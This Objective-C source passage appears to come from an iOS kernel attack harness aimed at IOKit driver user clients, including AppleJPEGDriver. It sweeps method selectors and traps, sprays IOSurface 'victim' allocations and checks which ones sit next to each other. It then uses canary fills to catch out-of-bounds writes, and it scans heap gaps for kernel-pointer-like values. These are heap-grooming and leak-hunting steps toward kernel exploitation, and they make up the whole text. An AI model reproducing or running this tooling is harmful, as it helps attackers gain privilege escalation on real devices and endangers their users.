          static void sel_sweep(uint32_t maxsel) {
              if (!g_nconn) { plog(@"SWEEP noconn"); ulog(@"SWEEP no conn"); return; }
              ulog(@"SWEEP 0-%u x %d conns", maxsel - 1, g_nconn);
              for (int ci = 0; ci < g_nconn; ci++) {
                  if (!g_conn[ci]) continue;
                  for (uint32_t s = 0; s < maxsel; s++) {
                      uint32_t sicmax = (s < 16) ? SIG_MAX : 0;
                      for (uint32_t sic = 0; sic <= sicmax; sic++) {
                          uint64_t sin[SCO]; for (uint32_t k = 0; k < SCO; k++) sin[k] = SV[k % SV_N];
                          uint64_t so[SCO] = {0}; size_t sc = 0;
                          uint8_t sb[64]; size_t szb = 64;
                          memset(sb, AAM, sizeof(sb));
                          kern_return_t kr = rawv(g_conn[ci], s, 0, sin, sic, NULL, 0, so, &sc, sb, &szb);
                          __sync_fetch_and_add(&g_done, 1);
                          if (kr != 0xe00002c2) {
                              g_any_sel[s] = 1;
                              if (s < 64) { g_tbl_mask |= (1ULL << s); g_sig[s] |= (uint16_t)(1u << sic); if (kr == KERN_SUCCESS) g_ok_sel |= (1ULL << s); }
                              __sync_fetch_and_add(&g_sigp, 1);
                              plog(@"SIG n%d s%u sic%u -> %@ so0=%llu", g_node[ci], s, sic, kr_name(kr), (unsigned long long)so[0]);
                              ulog(@"SIG n%d s%u sic%u -> %@", g_node[ci], s, sic, kr_name(kr));
                          } else __sync_fetch_and_add(&g_badarg, 1);
                      }
                  }
              }
              for (uint32_t s = 0; s < 64; s++) if (g_sig[s]) { plog(@"SIGMASK s%u = 0x%x", s, g_sig[s]); ulog(@"SIGMASK s%u = 0x%x", s, g_sig[s]); }
              plog(@"SWEEP mask=0x%llx sigp=%d ok=0x%llx", (unsigned long long)g_tbl_mask, g_sigp, (unsigned long long)g_ok_sel);
              ulog(@"SWEEP mask=0x%llx ok=0x%llx", (unsigned long long)g_tbl_mask, (unsigned long long)g_ok_sel);
          }

          static void map_all(void) {
              sel_sweep(SELSWEEP);
              uint32_t sels[64]; int ns = 0;
              for (uint32_t s = 0; s < 64 && ns < 64; s++) if (g_tbl_mask & (1ULL << s)) sels[ns++] = s;
              if (!ns) { sels[0] = 0; sels[1] = 2; sels[2] = 9; ns = 3; }
              int calls = 0;
              ulog(@"MAP matrix sels=%d conns=%d", ns, g_nconn);
              for (int ci = 0; ci < g_nconn; ci++) {
                  if (!g_conn[ci]) continue;
                  for (int si = 0; si < ns; si++) {
                      uint32_t sel = sels[si];
                      for (uint32_t sic = 0; sic <= SIG_MAX; sic++) {
                          if (sic > 0 && !(g_sig[sel] & (1u << sic))) continue;
                          for (int mo = 0; mo <= 2; mo++) {
                              probe1(ci, sel, mo, sic, 0, 0, "map"); calls++;
                              probe1(ci, sel, mo, sic, 3, 0, "map"); calls++;
                          }
                      }
                  }
              }
              ulog(@"MAP done live=%d calls=%d", g_ssw_hit, calls);
              int m = drain_port("map");
              ulog(@"MAP async msgs=%d", m);
          }

          static void traps(void) {
              int nsym = (g_trap0?1:0)+(g_trap1?1:0)+(g_trap2?1:0)+(g_trap3?1:0)+(g_trap4?1:0)+(g_trap5?1:0)+(g_trap6?1:0);
              if (!nsym) { plog(@"TRAP nosyms"); ulog(@"TRAP no syms"); return; }
              if (!g_nconn) { plog(@"TRAP noconn"); ulog(@"TRAP no conn"); return; }
              uint8_t* tb = calloc(1, FIXED);
              if (tb) memset(tb, PAT, FIXED);
              uintptr_t p = (uintptr_t)tb;
              ulog(@"TRAP start conns=%d syms=%d buf=0x%lx idx=0-15", g_nconn, nsym, (unsigned long)p);
              for (int ci = 0; ci < g_nconn; ci++) {
                  if (!g_conn[ci]) continue;
                  for (uint32_t idx = 0; idx <= 15; idx++) {
                      for (int n = 0; n <= 6; n++) {
                          kern_return_t kr = (kern_return_t)0xe00002c7;
                          switch (n) {
                              case 0: if (g_trap0) kr = g_trap0(g_conn[ci], idx); break;
                              case 1: if (g_trap1) kr = g_trap1(g_conn[ci], idx, p); break;
                              case 2: if (g_trap2) kr = g_trap2(g_conn[ci], idx, p, (uintptr_t)FIXED); break;
                              case 3: if (g_trap3) kr = g_trap3(g_conn[ci], idx, p, (uintptr_t)FIXED, (uintptr_t)g_sid); break;
                              case 4: if (g_trap4) kr = g_trap4(g_conn[ci], idx, p, (uintptr_t)FIXED, (uintptr_t)g_sid, 0); break;
                              case 5: if (g_trap5) kr = g_trap5(g_conn[ci], idx, p, (uintptr_t)FIXED, (uintptr_t)g_sid, 0, 0); break;
                              default: if (g_trap6) kr = g_trap6(g_conn[ci], idx, p, (uintptr_t)FIXED, (uintptr_t)g_sid, 0, 0, 0); break;
                          }
                          __sync_fetch_and_add(&g_done, 1);
                          plog(@"TRAP n%d idx%u a%d -> %@", g_node[ci], idx, n, kr_name(kr));
                          if (kr == KERN_SUCCESS) { __sync_fetch_and_add(&g_trap_ok, 1); ulog(@"!!! TRAP n%d idx%u a%d OK", g_node[ci], idx, n); }
                          usleep(40);
                      }
                  }
              }
              free(tb);
              ulog(@"trap done ok=%d", g_trap_ok);
          }

          static void addclient_all(void) {
              if (!g_addclient) { ulog(@"no addclient sym"); return; }
              if (!g_nconn) { plog(@"ADD noconn"); ulog(@"ADD no conn"); return; }
              ulog(@"ADD start conns=%d", g_nconn);
              int made = 0;
              for (int a = 0; a < g_nconn && made < PAIRCAP; a++) {
                  if (!g_conn[a]) continue;
                  for (int b = 0; b < g_nconn && made < PAIRCAP; b++) {
                      if (a == b || !g_conn[b]) continue;
                      if (g_kind[a] == 1 && g_kind[b] == 1) continue;
                      made++;
                      kern_return_t kr = g_addclient(g_conn[a], g_conn[b]);
                      __sync_fetch_and_add(&g_done, 1);
                      if (kr == KERN_SUCCESS) {
                          __sync_fetch_and_add(&g_addok, 1);
                          plog(@"ADD OK a%d(k%d) b%d(k%d)", g_node[a], g_kind[a], g_node[b], g_kind[b]);
                          ulog(@"!!! ADD OK a%d k%d b%d k%d", g_node[a], g_kind[a], g_node[b], g_kind[b]);
                          probe1(a, 2, 0, 0, 0, 0, "adda");
                          probe1(a, 9, 0, 0, 0, 0, "adda");
                      } else {
                          g_addfail[g_kind[a] & 3][g_kind[b] & 3]++;
                          plog(@"ADD a%d(k%d) b%d(k%d) -> %@", g_node[a], g_kind[a], g_node[b], g_kind[b], kr_name(kr));
                          ulog(@"ADD k%d->k%d %@", g_kind[a], g_kind[b], kr_name(kr));
                      }
                      usleep(40);
                  }
              }
              for (int i = 0; i < 4; i++) for (int j = 0; j < 4; j++) {
                  if (!g_addfail[i][j]) continue;
                  plog(@"ADDM k%d->k%d n=%d", i, j, g_addfail[i][j]);
                  ulog(@"ADDM k%d->k%d n=%d", i, j, g_addfail[i][j]);
              }
              ulog(@"add done pairs=%d ok=%d", made, g_addok);
          }

          static void vic_fill(int idx, uint8_t v) {
              if (idx < 0 || idx >= g_vicn || !g_vic[idx] || !g_surflock || !g_baseaddr) return;
              g_surflock(g_vic[idx], 0, NULL);
              size_t n = g_valloc[idx];
              uint8_t* b = g_baseaddr(g_vic[idx]);
              if (b) memset(b, v, n);
              g_surfunlock(g_vic[idx], 0, NULL);
          }
          static int vic_scan(int idx, size_t* first, size_t* dirty) {
              *first = (size_t)-1; *dirty = 0;
              if (idx < 0 || idx >= g_vicn || !g_vic[idx] || !g_surflock || !g_baseaddr) return 0;
              g_surflock(g_vic[idx], 0, NULL);
              uint8_t* b = g_baseaddr(g_vic[idx]);
              size_t n = g_valloc[idx];
              size_t d = 0, f = (size_t)-1;
              if (b) for (size_t i = 0; i < n; i++) if (b[i] != AAM) { d++; if (f == (size_t)-1) f = i; }
              g_surfunlock(g_vic[idx], 0, NULL);
              *first = f; *dirty = d;
              return d ? 1 : 0;
          }

          static CFMutableDictionaryRef make_sdict(void) {
              CFMutableDictionaryRef d = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
              int w = 64, h = 64, bpe = 4, bpr = 256, pf = 0x42475241;
              CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), (__bridge CFTypeRef)@(w));
              CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), (__bridge CFTypeRef)@(h));
              CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), (__bridge CFTypeRef)@(bpe));
              CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(bpr));
              CFDictionarySetValue(d, CFSTR("IOSurfacePixelFormat"), (__bridge CFTypeRef)@(pf));
              CFDictionarySetValue(d, CFSTR("IOSurfaceIsGlobal"), (__bridge CFTypeRef)@YES);
              return d;
          }

          static void surf_alloc(void) {
              if (!g_surfcreate || !g_surflock || !g_baseaddr || !g_allocusize) { ulog(@"surf syms missing"); return; }
              if (g_vicn) { ulog(@"surf already %d", g_vicn); return; }
              CFMutableDictionaryRef d = make_sdict();
              for (int i = 0; i < VIC_MAX; i++) {
                  IOSurfaceRef s = g_surfcreate(d);
                  if (!s) break;
                  g_vic[g_vicn] = s;
                  g_valloc[g_vicn] = g_allocusize(s);
                  g_vicn++;
              }
              CFRelease(d);
              plog(@"VIC n=%d", g_vicn);
              ulog(@"VIC n=%d", g_vicn);
              if (g_vicn < 4) return;

              uintptr_t prev = 0;
              for (int i = 0; i < g_vicn; i++) {
                  uintptr_t b = (uintptr_t)g_baseaddr(g_vic[i]);
                  size_t sz = g_valloc[i];
                  plog(@"VICB %d base=0x%lx sz=%zu", i, (unsigned long)b, sz);
                  if (prev && b > prev && (b - prev) == DELTA && g_pairn < 24) {
                      g_pair[g_pairn][0] = i - 1; g_pair[g_pairn][1] = i; g_pair[g_pairn][2] = (int)sz;
                      g_pairn++;
                      plog(@"PAIR %d->%d d=0x%lx", i - 1, i, (unsigned long)(b - prev));
                  }
                  prev = b;
              }
              plog(@"VIC pairs=%d delta=0x%x", g_pairn, DELTA);
              ulog(@"VIC pairs=%d", g_pairn);
              if (g_pairn == 0) ulog(@"VIC no adjacency");
          }

          static void canary(uint32_t sel, int mode, size_t zos, size_t zis, int arg0, uint32_t sic, const char* tag) {
              if (g_pairn == 0) { plog(@"CAN %s NO PAIRS", tag); ulog(@"CAN %s NO PAIRS", tag); return; }
              if (g_nconn == 0) { plog(@"CAN %s NO CONN", tag); ulog(@"CAN %s NO CONN", tag); return; }
              if (!g_cbuf) { g_cbuf = calloc(1, FIXED); if (g_cbuf) memset(g_cbuf, PAT, FIXED); }
              ulog(@"CAN %s START s%u pairs=%d conns=%d m%d zo=%zu zi=%zu a0=%d sic=%u", tag, sel, g_pairn, g_nconn, mode, zos, zis, arg0, sic);
              uint8_t* in = NULL;
              if (zis) { in = calloc(1, zis); if (!in) return; memset(in, PAT, zis); desc_into(in, zis); }
              for (int ci = 0; ci < g_nconn; ci++) {
                  if (!g_conn[ci]) continue;
                  for (int pi = 0; pi < g_pairn; pi++) {
                      int A = g_pair[pi][0], B = g_pair[pi][1];
                      vic_fill(B, AAM);
                      uint64_t sin[SCO] = {0};
                      if (arg0 == 1) sin[0] = (uint64_t)g_conn[ci];
                      else if (arg0 == 2) sin[0] = g_sid;
                      else if (arg0 == 3) for (uint32_t k = 0; k < SCO; k++) sin[k] = SV[k % SV_N];
                      else if (arg0 == 4) sin[0] = (uint64_t)g_cbuf;
                      uint64_t so[SCO] = {0}; size_t sc = 0;
                      uint8_t sb[FIXED]; size_t szb = zos;
                      memset(sb, AAM, sizeof(sb));
                      kern_return_t kr = rawx(g_conn[ci], sel, mode, sin, sic, in, zis, in ? 1 : 0, so, &sc, sb, &szb);
                      __sync_fetch_and_add(&g_done, 1);
                      __sync_fetch_and_add(&g_probes, 1);
                      size_t first = 0, dirty = 0;
                      int hit = vic_scan(B, &first, &dirty);
                      plog(@"CAN %s n%d p%d/%d s%u m%d zi=%zu zo=%zu a0=%d sic%u -> %@ sc=%zu szb=%zu hit=%d first=0x%zx dirty=%zu so0=%llu",
                           tag, g_node[ci], pi + 1, g_pairn, sel, mode, zis, zos, arg0, sic, kr_name(kr), sc, szb, hit, first, dirty, (unsigned long long)so[0]);
                      if (hit) {
                          __sync_fetch_and_add(&g_canary_w, 1);
                          g_canary_dirty = (int)dirty;
                          ulog(@"!!! CAN %s n%d s%u WRITE first=0x%zx dirty=%zu", tag, g_node[ci], sel, first, dirty);
                      }
                      if (szb > zos) {
                          __sync_fetch_and_add(&g_oobsz, 1);
                          ulog(@"!!! CAN %s SZB %zu > offered %zu", tag, szb, zos);
                          plog(@"OOBSZ %s offered=%zu driver=%zu", tag, zos, szb);
                      }
                      usleep(120);
                  }
              }
              free(in);
          }

          static void prop_rich(void) {
              if (!g_setprop) { ulog(@"no setprop sym"); return; }
              if (!g_nconn) { ulog(@"prop no conn"); return; }
              uint8_t blob[64]; memset(blob, PAT, sizeof(blob));
              if (g_sid) memcpy(blob, &g_sid, 4);
              CFDataRef d4 = CFDataCreate(NULL, blob, 4);
              CFDataRef d16 = CFDataCreate(NULL, blob, 16);
              CFMutableDictionaryRef sd = make_sdict();
              CFStringRef sref = CFSTR("AppleJPEGDriver");
              const char* keys[4] = { "IOSurfaceID", "BufferSize", "IOSurface", "buffer" };
              CFTypeRef vals[5];
              vals[0] = (__bridge CFTypeRef)@(g_sid);
              vals[1] = (__bridge CFTypeRef)@(4096);
              vals[2] = (CFTypeRef)d4;
              vals[3] = (CFTypeRef)d16;
              vals[4] = (CFTypeRef)sd;
              ulog(@"PROP rich conns=%d sid=0x%x", g_nconn, g_sid);
              for (int ci = 0; ci < g_nconn; ci++) {
                  if (!g_conn[ci]) continue;
                  for (int k = 0; k < 4; k++) {
                      for (int v = 0; v < 5; v++) {
                          kern_return_t kr = g_setprop(g_conn[ci], (__bridge CFStringRef)@(keys[k]), vals[v]);
                          __sync_fetch_and_add(&g_done, 1);
                          plog(@"PROP n%d k=%s v%d -> %@", g_node[ci], keys[k], v, kr_name(kr));
                          if (kr == KERN_SUCCESS) {
                              __sync_fetch_and_add(&g_propok, 1);
                              ulog(@"!!! PROP n%d %s v%d OK", g_node[ci], keys[k], v);
                              probe_x(ci, 9, 0, 0, 0, 0, 0, 0, "s9pr");
                              probe_x(ci, 9, 0, 0, 0, 4096, 0, 0, "s9pr");
                          }
                      }
                  }
                  kern_return_t kr2 = g_setprop(g_conn[ci], (__bridge CFStringRef)@("Class"), (CFTypeRef)sref);
                  if (kr2 == KERN_SUCCESS) ulog(@"!!! PROP n%d Class str OK", g_node[ci]);
              }
              CFRelease(d4); CFRelease(d16); CFRelease(sd);
              ulog(@"prop rich done ok=%d", g_propok);

              if (g_setprops) {
                  CFMutableDictionaryRef pd = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                  CFDictionarySetValue(pd, CFSTR("IOSurfaceID"), (__bridge CFTypeRef)@(g_sid));
                  CFDictionarySetValue(pd, CFSTR("BufferSize"), (__bridge CFTypeRef)@(4096));
                  for (int ci = 0; ci < g_nconn; ci++) {
                      if (!g_conn[ci]) continue;
                      kern_return_t kr = g_setprops(g_conn[ci], pd);
                      plog(@"SETPS n%d -> %@", g_node[ci], kr_name(kr));
                      if (kr == KERN_SUCCESS) ulog(@"!!! SETPS n%d OK", g_node[ci]);
                  }
                  CFRelease(pd);
              } else ulog(@"no setprops sym");
          }

          static void prop_readback(void) {
              const char* keys[4] = { "IOSurfaceID", "BufferSize", "IOSurface", "buffer" };
              if (g_getprop) {
                  ulog(@"GETP start conns=%d", g_nconn);
                  for (int ci = 0; ci < g_nconn; ci++) {
                      if (!g_conn[ci]) continue;
                      for (int k = 0; k < 4; k++) {
                          CFTypeRef v = NULL;
                          kern_return_t kr = g_getprop(g_conn[ci], (__bridge CFStringRef)@(keys[k]), &v);
                          plog(@"GETP n%d k=%s -> %@ v=%s", g_node[ci], keys[k], kr_name(kr), v ? "set" : "null");
                          if (kr == KERN_SUCCESS && v) {
                              __sync_fetch_and_add(&g_getpropok, 1);
                              CFTypeID t = CFGetTypeID(v);
                              const char* tn = t == CFDataGetTypeID() ? "data" : (t == CFDictionaryGetTypeID() ? "dict" : (t == CFStringGetTypeID() ? "str" : "num"));
                              ulog(@"!!! GETP n%d %s OK type=%s", g_node[ci], keys[k], tn);
                              CFRelease(v);
                          }
                      }
                  }
                  ulog(@"getp done ok=%d", g_getpropok);
              } else ulog(@"no getprop sym");

              dump_props(g_root, 900);
              for (int i = 1; i <= g_nchild; i++) dump_props(g_child[i], 900 + i);
              ulog(@"prop readback done");
          }

          static void seq_probe(void) {
              if (!g_nconn) { ulog(@"seq no conn"); return; }
              ulog(@"SEQ start conns=%d", g_nconn);
              for (int ci = 0; ci < g_nconn; ci++) {
                  if (!g_conn[ci]) continue;
                  uint64_t so[SCO] = {0}; size_t sc = 0; uint8_t sb[64]; size_t szb = 64;
                  memset(sb, AAM, sizeof(sb));
                  kern_return_t a = rawv(g_conn[ci], 0, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
                  sc = 0; szb = 64; memset(sb, AAM, sizeof(sb));
                  kern_return_t b = rawv(g_conn[ci], 9, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
                  plog(@"SEQ n%d s0=%s s9=%s", g_node[ci], kr_name(a).UTF8String, kr_name(b).UTF8String);
                  if (b != 0xe00002bc) ulog(@"!!! SEQ n%d s0=%s s9=%s", g_node[ci], kr_name(a), kr_name(b));
                  __sync_fetch_and_add(&g_done, 2);

                  sc = 0; szb = 64; memset(sb, AAM, sizeof(sb));
                  a = rawv(g_conn[ci], 2, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
                  sc = 0; szb = 64; memset(sb, AAM, sizeof(sb));
                  b = rawv(g_conn[ci], 9, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
                  plog(@"SEQ2 n%d s2=%s s9=%s", g_node[ci], kr_name(a).UTF8String, kr_name(b).UTF8String);
                  if (b != 0xe00002bc) ulog(@"!!! SEQ2 n%d s2=%s s9=%s", g_node[ci], kr_name(a), kr_name(b));

                  rawv(g_conn[ci], 0, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
                  rawv(g_conn[ci], 2, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
                  sc = 0; szb = 64; memset(sb, AAM, sizeof(sb));
                  b = rawv(g_conn[ci], 9, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
                  plog(@"SEQ3 n%d s9=%s", g_node[ci], kr_name(b).UTF8String);
                  if (b != 0xe00002bc) ulog(@"!!! SEQ3 n%d s9=%s", g_node[ci], kr_name(b));
                  usleep(60);
              }
              ulog(@"seq done");
          }

          static void gap_forensics(void) {
              if (g_vicn < 2) { plog(@"GAP no surf"); ulog(@"gap no surf"); return; }
              int found = 0, examined = 0;
              for (int i = 0; i + 1 < g_vicn; i++) {
                  uintptr_t b0 = (uintptr_t)g_baseaddr(g_vic[i]);
                  uintptr_t b1 = (uintptr_t)g_baseaddr(g_vic[i + 1]);
                  size_t sz = g_valloc[i];
                  if (b1 <= b0) continue;
                  size_t gap = (size_t)(b1 - (b0 + sz));
                  if (gap == 0 || gap > 0x40000) continue;
                  examined++;
                  const uint8_t* p = (const uint8_t*)(b0 + sz);
                  size_t nz = 0, ptrlike = 0;
                  for (size_t k = 0; k < gap; k++) if (p[k]) nz++;
                  for (size_t k = 0; k + 8 <= gap && k < 256; k += 8) {
                      uint64_t v = 0; memcpy(&v, p + k, 8);
                      if ((v >> 40) == 0xffffff || (v >> 40) == 0xffff || (v >> 48) == 0xffff) ptrlike++;
                  }
                  g_gapnz[i] = nz; g_gapbase[i] = (uintptr_t)p; g_gapsz[i] = gap;
                  plog(@"GAP %d->%d gap=0x%zx nz=%zu ptrlike=%zu full=%@", i, i + 1, gap, nz, ptrlike, hexn(p, gap, 192));
                  ulog(@"GAP %d gap=0x%zx nz=%zu ptr=%zu", i, gap, nz, ptrlike);
                  if (nz) found++;
              }
              plog(@"GAP examined=%d nz=%d", examined, found);
              ulog(@"gap examined=%d nz=%d", examined, found);

              int orig = g_vicn;
              if (g_surfcreate) {
                  CFMutableDictionaryRef d = make_sdict();
                  IOSurfaceRef tmp[16]; int tn = 0;
                  for (int i = 0; i < 16; i++) { IOSurfaceRef s = g_surfcreate(d); if (!s) break; tmp[tn++] = s; }
                  CFRelease(d);
                  plog(@"GAP churn alloc=%d", tn);
                  ulog(@"gap churn +%d", tn);
                  int changed = 0;
                  for (int i = 0; i + 1 < orig; i++) {
                      if (!g_gapsz[i]) continue;
                      const uint8_t* p = (const uint8_t*)g_gapbase[i];
                      size_t nz2 = 0;
                      for (size_t k = 0; k < g_gapsz[i]; k++) if (p[k]) nz2++;
                      if (nz2 != g_gapnz[i]) { changed++; plog(@"GAPCH %d %zu->%zu", i, g_gapnz[i], nz2); }
                  }
                  plog(@"GAP churn changed=%d", changed);
                  ulog(@"gap churn changed=%d", changed);
                  for (int i = 0; i < tn; i++) CFRelease(tmp[i]);
              }
              g_gapread = found;
          }

          static void argmatrix(void) {
              if (!g_nconn) { ulog(@"AM no conn"); return; }
              ulog(@"AM start conns=%d", g_nconn);
              size_t zoc[6] = {0, 1, 2, 4, 8, 16};
              size_t zos[8] = {0, 4, 8, 16, 64, 192, 1024, 4096};
              ulog(@"AM phase1 out-geometry s9");
              for (int ci = 0; ci < g_nconn; ci++) {
                  if (!g_conn[ci]) continue;
                  for (int i = 0; i < 6; i++) for (int j = 0; j < 8; j++)
                      probe_x(ci, 9, 0, 0, zoc[i], zos[j], 0, 0, "am9o");
              }
              ulog(@"AM phase2 struct-in zo0/zo4096 s9");
              size_t zis[10] = {4, 8, 16, 24, 32, 64, 192, 256, 1024, 4096};
              for (int ci = 0; ci < g_nconn; ci++) {
                  if (!g_conn[ci]) continue;
                  for (int i = 0; i < 10; i++) {
                      probe_x(ci, 9, 1, 0, 0, 0, zis[i], 0, "am9i");
                      probe_x(ci, 9, 1, 0, 0, 4096, zis[i], 0, "am9i");
                      probe_x(ci, 9, 1, 0, 1, 0, zis[i], 0, "am9i");
                  }
              }
              ulog(@"AM phase3 struct-in baseline s0 s2");
              for (int ci = 0; ci < g_nconn; ci++) {
                  if (!g_conn[ci]) continue;
                  for (int i = 0; i < 10; i++) {
                      probe_x(ci, 0, 1, 0, 0, 0, zis[i], 0, "am0i");
                      probe_x(ci, 2, 1, 0, 0, 0, zis[i], 0, "am2i");
                  }
              }
              ulog(@"AM phase4 scalars zo0 s9");
              for (int ci = 0; ci < g_nconn; ci++) {
                  if (!g_conn[ci]) continue;
                  for (uint32_t sic = 1; sic <= 4; sic++)
                      for (int a0 = 0; a0 <= 3; a0++)
                          probe_x(ci, 9, 0, sic, 0, 0, 0, a0, "am9s");
              }
              int m = drain_port("am");
              ulog(@"AM done async=%d", m);
          }

          static void s9_sid(void) {
              if (!g_surfid || g_vicn == 0) { ulog(@"s9sid no vic"); return; }
              if (!g_nconn) { ulog(@"s9sid no conn"); return; }
              int idxs[6]; int n = 0;
              int stride = g_vicn / 6; if (stride < 1) stride = 1;
              for (int i = 0; i < g_vicn && n < 6; i += stride) idxs[n++] = i;
              uint32_t ids[6];
              for (int i = 0; i < n; i++) ids[i] = g_surfid(g_vic[idxs[i]]);
              ulog(@"S9SID start conns=%d vic=%d ids=%d", g_nconn, g_vicn, n);
              int moved = 0;
              for (int ci = 0; ci < g_nconn; ci++) {
                  if (!g_conn[ci]) continue;
                  for (int i = 0; i < n; i++) {
                      if (!ids[i]) continue;
                      SV[3] = ids[i];
                      uint64_t so[SCO] = {0}; size_t sc = 0; uint8_t sb[64]; size_t szb = 64;
                      memset(sb, AAM, sizeof(sb));
                      kern_return_t kr = rawv(g_conn[ci], 9, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
                      __sync_fetch_and_add(&g_done, 1);
                      plog(@"S9SID n%d vid=0x%x -> %@ so0=%llu", g_node[ci], ids[i], kr_name(kr), (unsigned long long)so[0]);
                      if (kr != 0xe00002bc) { moved++; __sync_fetch_and_add(&g_hits, 1); ulog(@"!!! S9SID n%d vid=0x%x %@", g_node[ci], ids[i], kr_name(kr)); }
                      usleep(60);
                  }
              }
              SV[3] = g_sid;
              ulog(@"s9sid done moved=%d", moved);
          }

          static void wide_sweep(void) {
              if (!g_nconn) { ulog(@"WS no conn"); return; }
              ulog(@"WS 256-%d x %d", HI_MAX - 1, g_nconn);
              int hits = 0;
              for (uint32_t s = 256; s < HI_MAX; s++) {
                  for (int ci = 0; ci < g_nconn; ci++) {
                      if (!g_conn[ci]) continue;
                      uint64_t so[SCO] = {0}; size_t sc = 0; uint8_t sb[16]; size_t szb = 16;
                      memset(sb, AAM, sizeof(sb));
                      kern_return_t kr = rawv(g_conn[ci], s, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
                      __sync_fetch_and_add(&g_done, 1);
                      if (kr != 0xe00002c2) {
                          hits++;
                          g_any_sel[s] = 1;
                          __sync_fetch_and_add(&g_hi_sel, 1);
                          plog(@"WS n%d s%u -> %@ so0=%llu", g_node[ci], s, kr_name(kr), (unsigned long long)so[0]);
                          ulog(@"!!! WS n%d s%u %@", g_node[ci], s, kr_name(kr));
                      } else __sync_fetch_and_add(&g_badarg, 1);
                  }
                  if (s % 256 == 0) ulog(@"WS at %u hits=%d", s, hits);
              }
              plog(@"WS done hits=%d", hits);
              ulog(@"WS done hits=%d", hits);
          }

